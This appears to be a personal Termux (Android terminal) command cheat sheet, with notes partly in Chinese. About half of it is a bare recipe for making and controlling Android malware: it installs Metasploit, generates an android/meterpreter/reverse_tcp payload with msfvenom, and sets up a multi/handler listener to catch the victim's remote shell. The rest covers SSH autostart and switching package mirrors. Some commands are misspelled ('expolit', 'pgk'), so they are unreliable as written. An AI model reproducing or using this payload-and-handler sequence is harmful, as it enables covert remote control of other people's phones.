# termux
---

apt update && apt upgrade

pkg install unstable-repo

pkg install metasploit

msfvenom -p android/meterpreter/reverse_tcp LHOST=

msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST 

set LPORT

expolit

pkg install vim

passwd

pgk upgrade

pkg install openssh 8022

sshd

pkill ssh

apt install tsu

tsu

echo "sshd" >> ~/.bashrc auto-ssh

手动修改

编辑 $PREFIX/etc/apt/sources.list 修改为如下内容

deb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main

编辑 $PREFIX/etc/apt/sources.list.d/science.list 修改为如下内容

deb https://mirrors.tuna.tsinghua.edu.cn/termux/science-packages-24 science stable

编辑 $PREFIX/etc/apt/sources.list.d/game.list 修改为如下内容

deb https://mirrors.tuna.tsinghua.edu.cn/termux/game-packages-24 games stable

